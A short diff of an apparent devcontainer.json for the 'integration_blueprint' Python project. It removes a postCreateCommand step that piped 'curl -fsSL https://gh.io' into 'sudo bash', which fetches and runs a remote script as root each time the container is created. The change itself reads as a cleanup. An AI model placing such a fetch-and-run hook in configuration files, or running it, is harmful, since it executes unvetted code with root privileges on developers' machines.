@@ -1,7 +1,7 @@
 {
     "name": "ludeeus/integration_blueprint",
     "image": "mcr.microsoft.com/devcontainers/python:3.13",
-    "postCreateCommand": "scripts/setup && curl -fsSL https://gh.io | sudo bash",
+    "postCreateCommand": "scripts/setup",
     "forwardPorts": [
         8123
     ],
